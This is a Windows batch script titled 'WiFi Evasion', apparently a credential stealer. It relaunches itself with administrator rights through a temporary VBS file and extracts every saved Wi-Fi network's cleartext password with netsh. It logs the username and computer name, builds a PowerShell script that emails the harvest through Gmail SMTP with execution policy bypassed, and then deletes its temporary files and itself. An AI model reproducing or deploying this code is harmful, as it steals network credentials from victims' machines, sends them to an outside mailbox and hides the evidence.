@ECHO OFF & SETLOCAL ENABLEDELAYEDEXPANSION
TITLE WiFi Evasion [MAIL] - LESiO
MODE CON COLS=18 LINES=1
CLS & COLOR 05
IF _%1_==_SCRIPT_ GOTO :SCRIPT
SET C=0 
SET L=0 
:UAC
    SET UAC=%TEMP%\UAC.VBS
(
    ECHO SET UAC = CREATEOBJECT^("SHELL.APPLICATION"^)
    ECHO UAC.SHELLEXECUTE "%~S0", "SCRIPT %~SDP0 %*", "", "RUNAS", 1
)> "%UAC%"
    "%TEMP%\UAC.VBS"
    DEL "%TEMP%\UAC.VBS"
GOTO :EOF
:SCRIPT
CALL :S
CALL :L
SET O=%RANDOM%%RANDOM%%RANDOM%
SET O2=%RANDOM%%RANDOM%%RANDOM%
SET PASSWORDLOGS=%TEMP%\%O%.TXT
SET MAILSCRIPT=%TEMP%\%O2%.PS1
    ECHO WiFi Evasion - LESiO >> %PASSWORDLOGS%
    ECHO( >> %PASSWORDLOGS%
    ECHO DATE : %DATE% %TIME% >> %PASSWORDLOGS%
    ECHO USERNAME : %USERNAME% >> %PASSWORDLOGS%
    ECHO COMPUTER : %COMPUTERNAME% >> %PASSWORDLOGS%
    ECHO PROCESSOR ARCHITECTURE : %PROCESSOR_ARCHITECTURE% >> %PASSWORDLOGS%
    ECHO( >> %PASSWORDLOGS%
    ECHO [N][SSID] ====^> [PASSWORD] >>%PASSWORDLOGS%
    ECHO( >> %PASSWORDLOGS%
FOR /F "SKIP=2 DELIMS=: TOKENS=2" %%A IN ('NETSH WLAN SHOW PROFILES') DO (
    IF NOT "%%A"=="" (
        SET "SSID=%%A"
        SET "SSID=!SSID:~1!"
        CALL :P "!SSID!"
    )
)
TYPE %PASSWORDLOGS%
FOR /F "TOKENS=* DELIMS=" %%X IN (%PASSWORDLOGS%) DO SET BODY=!BODY!%%X
    ECHO $MailFrom = "sender@gmail.com" >> %MAILSCRIPT%
    ECHO $MailTo = "receiver@gmail.com" >> %MAILSCRIPT%
    ECHO $Subject = "WiFi Evasion - %USERNAME%" >> %MAILSCRIPT%
    ECHO $Body = "%BODY%" >> %MAILSCRIPT%
    ECHO $SMTPServer = "smtp.gmail.com" >> %MAILSCRIPT%
    ECHO $SMTPClient = New-Object Net.Mail.SMTPClient($SMTPServer, 587) >> %MAILSCRIPT%
    ECHO $SMTPClient.EnableSSL = $True >> %MAILSCRIPT%
    ECHO $SMTPClient.Credentials = New-Object System.Net.NetworkCredential("sender@gmail.com", "SenderPassword"); >> %MAILSCRIPT%
    ECHO $SMTPClient.Send($MailFrom, $MailTo, $Subject, $Body) >> %MAILSCRIPT%
    START POWERSHELL.EXE -EXECUTIONPOLICY BYPASS -FILE "%MAILSCRIPT%"
TIMEOUT /T 5
DEL %MAILSCRIPT%
DEL %PASSWORDLOGS%
(GOTO) 2>NUL & DEL "%~F0"
:P
SET "NAME=%1"
SET "NAME=!NAME:"=!"
SET "PASSWORD="
FOR /F "DELIMS=: TOKENS=2" %%A IN ('NETSH WLAN SHOW PROFILES %1 KEY^=CLEAR ^|FIND /I "CONT"') DO (
    SET "PASSWORD=%%A"
    SET /A C+=1
)
IF DEFINED PASSWORD (
    SET PASSWORD=!PASSWORD:~1!
    ECHO [!C!][!NAME!] ====^> [!PASSWORD!] >> "%PASSWORDLOGS%"
) ELSE (
    SET /A C+=1
ECHO [!C!][!NAME!] EMPTY PASSWORD >> "%PASSWORDLOGS%"
)
EXIT /B
:S
PROMPT $G
FOR /F "DELIMS=." %%A IN ('"PROMPT $H. & FOR %%B IN (1) DO REM"') DO SET "BS=%%A"
EXIT /B
:C
SET NL=%3
IF NOT DEFINED NL ECHO REQUIRES THIRD ARGUMENT & PAUSE > NUL & GOTO :EOF
IF %3 == 0 (
    <NUL SET /P ".=%BS%">%2 & FINDSTR /V /A:%1 /R "^$" %2 NUL & DEL %2 2>&1 & GOTO :EOF
) ELSE IF %3 == 1 (
    ECHO %BS%>%2 & FINDSTR /V /A:%1 /R "^$" %2 NUL & DEL %2 2>&1 & GOTO :EOF
)
EXIT /B
:L
FOR /F "SKIP=2 DELIMS=: TOKENS=2" %%A IN ('NETSH WLAN SHOW PROFILES') DO (
    IF NOT "%%A"=="" (
        SET /A L+=1
    )
)
SET /A L=!L! + 10
EXIT /B
